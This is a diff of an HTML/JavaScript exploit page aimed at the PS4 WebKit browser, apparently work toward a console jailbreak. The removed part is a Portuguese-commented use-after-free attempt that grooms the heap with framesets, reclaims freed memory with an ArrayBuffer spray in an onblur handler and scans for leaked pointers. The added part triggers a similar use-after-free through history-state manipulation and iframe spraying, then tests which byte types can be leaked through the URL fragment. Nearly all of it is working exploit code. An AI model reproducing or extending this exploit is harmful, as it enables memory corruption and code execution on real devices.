@@ -2,168 +2,250 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - Focus/Blur Exploit</title>
-<style>
-    body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
-    button { 
-        padding: 20px; width: 100%; margin-bottom: 10px;
-        font-weight: bold; font-size: 16px; cursor: pointer; 
-        border: 2px solid #f0f; background: #202; color: #fff;
-    }
-    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 400px; overflow-y: scroll;}
-    .leak { background-color: #fff; color: #f00; font-size: 1.5em; font-weight: bold; border: 5px solid #f00; padding: 10px; }
-</style>
+<title>PS4 WebKit UAF - Controlled Data Leak</title>
 </head>
 <body>
-<h2>PS4 WebKit - Event-Driven Reclaim (PSFree Logic)</h2>
-<div id="status">Método: input.onblur (Zero Delay)</div>
-<button onclick="runEventExploit()">INICIAR ATAQUE DE EVENTO</button>
-<div id="log"></div>
+<h2>PS4 WebKit UAF - Controlled Data Leak</h2>
+<button onclick="runTest1()">TEST 1 - Unicode Encoding Leak</button>
+<button onclick="runTest2()">TEST 2 - URL Encode Binary Data</button>
+<button onclick="runTest3()">TEST 3 - Mixed ASCII Pattern</button>
+<button onclick="runTest4()">TEST 4 - Zero Bytes Injection</button>
+<pre id="log"></pre>
 
 <script>
 const logEl = document.getElementById("log");
-const statusEl = document.getElementById("status");
-let views = []; // Mantém as views vivas
+function log(m){ logEl.textContent += m + "\n"; }
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-function log(m) { 
-    const d = document.createElement("div");
-    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${m}`;
-    logEl.appendChild(d);
-    logEl.scrollTop = logEl.scrollHeight;
+function readU32(url, offset) {
+    if(offset + 3 >= url.length) return null;
+    return url.charCodeAt(offset) |
+           (url.charCodeAt(offset+1) << 8) |
+           (url.charCodeAt(offset+2) << 16) |
+           (url.charCodeAt(offset+3) << 24);
 }
 
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-// TÉCNICA PSFREE: Preparar o terreno com framesets
-// Isso isola o HistoryItem para que ele caia num lugar previsível
-var fsets = [];
-function prepare_heap() {
-    log("1. Preparando Heap (Grooming)...");
-    const COMMAS = 8; // Pequeno, só para alinhar fastMalloc
-    const ROWS = ",".repeat(COMMAS);
+// Core UAF trigger with controlled data
+async function triggerControlledUAF(dataGenerator) {
+    let size = 977;
+    const STEP = 14461;
     
-    for(let i=0; i<200; i++) {
-        let f = document.createElement("frameset");
-        f.rows = ROWS;
-        fsets.push(f);
-    }
-}
-
-async function runEventExploit() {
-    logEl.innerHTML = "";
-    views = [];
-    fsets = [];
-    statusEl.innerText = "Rodando...";
-
-    prepare_heap();
-
-    // Cria elementos DOM necessários para o truque do foco
-    const input = document.createElement("input");
-    input.style.opacity = "0";
-    document.body.appendChild(input);
-    
-    const anchor = document.createElement("a");
-    anchor.id = "bar"; // Âncora para navegação
-    document.body.appendChild(anchor);
-
-    // Variáveis de controle
-    let uaf_triggered = false;
-
-    // --- O GATILHO MÁGICO (ONBLUR) ---
-    // Isso roda EXATAMENTE quando o history.back() processa a troca de página
-    input.onblur = function() {
-        log(">>> EVENTO BLUR DISPARADO <<<");
+    for(let i=0; i<48; i++){
+        let frag = dataGenerator(size, i);
         
-        // 1. Limpa os framesets vizinhos (abre espaço)
-        // Isso é crucial no psfree: libera memória AO REDOR do alvo
-        for(let f of fsets) {
-            f.rows = "";
-        }
-        fsets = []; // Deixa o GC limpar
-
-        // 2. SPRAY IMEDIATO (RECLAIM)
-        // Tamanho 64 bytes (Confirmado pelo teste CCCC)
-        log("Spraying 2000 buffers de 64 bytes...");
-        for(let i=0; i<2000; i++) {
-            // Cria ArrayBuffer e Uint32Array view
-            let buf = new ArrayBuffer(64);
-            let view = new Uint32Array(buf);
-            
-            // Marca com AAAA para ver se é sobrescrito
-            view[0] = 0x41414141; 
-            view[1] = 0x41414141;
-            
-            views.push(view);
-        }
+        history.pushState({}, "", "#" + frag);
+        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
         
-        uaf_triggered = true;
-    };
-
-    // --- SEQUÊNCIA DE DISPARO ---
-    log("2. Configurando Histórico...");
-    
-    // Empilha estados para poder voltar
-    // Usamos fragmentos (#) para não recarregar a página inteira
-    history.pushState("state1", "", "#foo");
-    history.pushState("state2", "", "#bar");
-
-    log("3. Focando input e disparando back()...");
-    
-    // Força o foco no input
-    input.focus();
-    
-    // Pequena pausa para o navegador registrar o foco
-    await sleep(100);
-    
-    // O DISPARO:
-    // history.back() vai tentar ir para #foo.
-    // Isso tira o foco do input -> dispara onblur -> executa o spray.
-    // Tudo numa única thread síncrona.
-    history.back();
-
-    // Espera o evento acontecer
-    await sleep(500);
-
-    if(!uaf_triggered) {
-        log("Erro: O evento onblur não disparou. Tente clicar na página antes.");
-        return;
+        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+        
+        size += STEP;
+        await sleep(5);
     }
-
-    // --- VERIFICAÇÃO ---
-    log("4. Checando se algum buffer foi corrompido...");
     
-    let leaked = false;
-    for(let i=0; i<views.length; i++) {
-        let v = views[i];
-        // Se o primeiro inteiro não for mais AAAA, algo escreveu nele!
-        if(v[0] !== 0x41414141) {
-            leaked = true;
-            log(`!!! LEAK DETECTADO NO INDEX ${i} !!!`);
-            
-            let v0 = "0x" + v[0].toString(16).padStart(8,'0');
-            let v1 = "0x" + v[1].toString(16).padStart(8,'0');
-            
-            log(`Valor Original: 0x41414141`);
-            log(`Valor Novo:     ${v0}`);
-            log(`Próximo Valor:  ${v1}`);
-            
-            statusEl.className = "leak";
-            statusEl.innerText = `LEAK: ${v0}`;
-            
-            // Se conseguirmos isso, o próximo passo é usar esse leak para calcular o endereço base.
-            break;
+    await sleep(120);
+    
+    let frames = [];
+    for(let i=0; i<80; i++){
+        let f = document.createElement("iframe");
+        document.body.appendChild(f);
+        try {
+            let d = f.contentDocument;
+            d.open();
+            d.write("<html><body>X</body></html>");
+            d.close();
+        } catch(e){}
+        frames.push(f);
+    }
+    frames.forEach(f=>f.remove());
+    
+    await sleep(80);
+}
+
+// TEST 1 - Unicode characters (high bytes)
+async function runTest1(){
+    logEl.textContent = "";
+    log("=== TEST 1: Unicode Encoding Leak ===\n");
+    
+    await triggerControlledUAF((size, iter) => {
+        // Use Unicode characters to create non-ASCII bytes
+        let pattern = "";
+        for(let i=0; i<size; i++){
+            // Cycle through Unicode range
+            let code = 0x0100 + (i % 256);
+            pattern += String.fromCharCode(code);
+        }
+        return pattern;
+    });
+    
+    let url = document.URL;
+    log("URL Length: " + url.length);
+    
+    // Check if Unicode survived
+    log("\nFirst 200 bytes (hex):");
+    for(let i=0; i<200; i+=16){
+        let hex = "";
+        for(let j=0; j<16 && i+j<url.length; j++){
+            hex += url.charCodeAt(i+j).toString(16).padStart(4,'0') + " ";
+        }
+        log(hex);
+    }
+    
+    // Scan for high bytes
+    let highBytes = 0;
+    for(let i=0; i<Math.min(10000, url.length); i++){
+        if(url.charCodeAt(i) > 0xFF){
+            highBytes++;
         }
     }
-
-    if(!leaked) {
-        log("Falha: Todos os buffers continuam 'AAAA'.");
-        log("Possível causa: O GC não rodou rápido o suficiente ou o tamanho 64 precisa de ajuste fino (+/- 16).");
+    
+    log("\nHigh bytes (>0xFF) found: " + highBytes);
+    
+    if(highBytes > 0){
+        log("SUCCESS: Unicode preserved - can leak arbitrary bytes");
+    } else {
+        log("WARN: Unicode stripped - limited to ASCII");
     }
     
-    // Limpeza
-    document.body.removeChild(input);
-    document.body.removeChild(anchor);
+    log("\n=== TEST 1 END ===");
 }
+
+// TEST 2 - URL encoding to bypass restrictions
+async function runTest2(){
+    logEl.textContent = "";
+    log("=== TEST 2: URL Encode Binary Data ===\n");
+    
+    await triggerControlledUAF((size, iter) => {
+        // Create pattern with URL-encoded "binary"
+        let pattern = "";
+        for(let i=0; i<size/3; i++){
+            // Encode bytes as %XX
+            let byte = i % 256;
+            pattern += "%" + byte.toString(16).padStart(2,'0');
+        }
+        return pattern;
+    });
+    
+    let url = document.URL;
+    log("URL Length: " + url.length);
+    log("First 200 chars:\n" + url.substring(0,200));
+    
+    // Check if %XX patterns survived
+    let encoded = url.match(/%[0-9a-f]{2}/gi);
+    log("\nURL-encoded sequences found: " + (encoded ? encoded.length : 0));
+    
+    if(encoded && encoded.length > 100){
+        log("SUCCESS: URL encoding preserved");
+        log("Sample: " + encoded.slice(0,10).join(" "));
+    }
+    
+    log("\n=== TEST 2 END ===");
+}
+
+// TEST 3 - Mixed ASCII pattern for structure detection
+async function runTest3(){
+    logEl.textContent = "";
+    log("=== TEST 3: Mixed ASCII Pattern ===\n");
+    
+    await triggerControlledUAF((size, iter) => {
+        // Create structured pattern:
+        // AAAABBBBCCCCDDDD... (4-byte chunks)
+        let pattern = "";
+        for(let i=0; i<size; i+=4){
+            let chunk = String.fromCharCode(
+                0x41 + (i/4) % 26,
+                0x42 + (i/4) % 26,
+                0x43 + (i/4) % 26,
+                0x44 + (i/4) % 26
+            );
+            pattern += chunk;
+        }
+        return pattern;
+    });
+    
+    let url = document.URL;
+    log("URL Length: " + url.length);
+    
+    log("\nScanning for 4-byte patterns:");
+    
+    let patterns = new Map();
+    for(let i=0; i<Math.min(10000, url.length-4); i+=4){
+        let chunk = url.substring(i, i+4);
+        patterns.set(chunk, (patterns.get(chunk) || 0) + 1);
+    }
+    
+    log("Unique patterns found: " + patterns.size);
+    
+    let top10 = Array.from(patterns.entries())
+        .sort((a,b) => b[1] - a[1])
+        .slice(0, 10);
+    
+    log("\nTop 10 patterns:");
+    top10.forEach(([pat, count]) => {
+        let hex = Array.from(pat).map(c => 
+            c.charCodeAt(0).toString(16).padStart(2,'0')
+        ).join(' ');
+        log("  " + hex + " : " + count + " times");
+    });
+    
+    log("\n=== TEST 3 END ===");
+}
+
+// TEST 4 - Zero bytes and control characters
+async function runTest4(){
+    logEl.textContent = "";
+    log("=== TEST 4: Zero Bytes Injection ===\n");
+    
+    await triggerControlledUAF((size, iter) => {
+        // Try to inject null bytes
+        let pattern = "";
+        for(let i=0; i<size; i++){
+            // Alternate between 'A' and null
+            pattern += (i % 2 === 0) ? "A" : "\x00";
+        }
+        return pattern;
+    });
+    
+    let url = document.URL;
+    log("URL Length: " + url.length);
+    
+    // Scan for null bytes
+    let nullCount = 0;
+    let firstNull = -1;
+    
+    for(let i=0; i<Math.min(10000, url.length); i++){
+        if(url.charCodeAt(i) === 0){
+            nullCount++;
+            if(firstNull === -1) firstNull = i;
+        }
+    }
+    
+    log("Null bytes found: " + nullCount);
+    if(firstNull !== -1){
+        log("First null at offset: " + firstNull);
+    }
+    
+    if(nullCount > 100){
+        log("\nSUCCESS: Null bytes preserved");
+        log("This means we can inject arbitrary binary data");
+    } else if(nullCount > 0){
+        log("\nPARTIAL: Some nulls preserved");
+    } else {
+        log("\nFAIL: Nulls stripped or URL truncated");
+    }
+    
+    // Check if URL was truncated at first null
+    log("\nURL appears truncated: " + (url.length < 100000 ? "YES" : "NO"));
+    
+    log("\n=== TEST 4 END ===");
+}
+
+log("PS4 WebKit UAF - Controlled Data Leak Tests");
+log("Goal: Find what data types can be leaked via URL fragment");
+log("\n1. Unicode - test high byte preservation");
+log("2. URL Encoding - test %XX encoding");
+log("3. Mixed ASCII - test pattern detection");
+log("4. Zero Bytes - test null byte handling");
+log("\nExecute in order to understand data constraints");
 </script>
 </body>
 </html>
